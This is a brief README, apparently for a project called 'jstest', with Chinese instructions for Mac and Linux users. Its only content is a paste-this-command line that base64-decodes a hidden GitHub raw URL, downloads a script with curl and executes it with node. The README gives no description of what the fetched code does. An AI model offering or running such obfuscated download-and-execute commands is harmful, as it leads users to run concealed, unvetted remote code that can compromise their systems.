# jstest

MAC用户执行：
node -e "$(curl -fsSL $(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dkb25neHYvanN0ZXN0L21hc3Rlci90ZXN0LmpzCg== | base64 -D))"
Linux(centos测试通过)用户执行：
node -e "$(curl -fsSL $(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dkb25neHYvanN0ZXN0L21hc3Rlci90ZXN0LmpzCg== | base64 -d))"
